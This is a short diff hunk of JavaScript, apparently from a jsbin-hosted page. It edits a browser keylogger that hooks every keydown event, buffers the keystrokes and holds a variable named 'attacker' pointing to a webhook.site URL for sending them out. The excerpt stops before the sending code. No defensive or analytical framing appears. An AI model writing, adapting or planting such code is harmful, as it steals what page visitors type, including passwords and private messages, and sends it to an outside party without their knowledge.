@@ -28,13 +28,13 @@ Released under the MIT license: http://jsbin.mit-license.org
     var buffer = [];
 var attacker = 'https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?c='
 
-document.onkeypress = function(e) {
+document.onkeydown = function(e) {
     var timestamp = Date.now() | 0;
     var stroke = e.key;
 //         {
 //         k: e.key,
 //         t: timestamp
-    };
+//     };
     buffer.push(stroke);
   if (buffer.length > 10) {
 //     if (buffer.length > 0) {
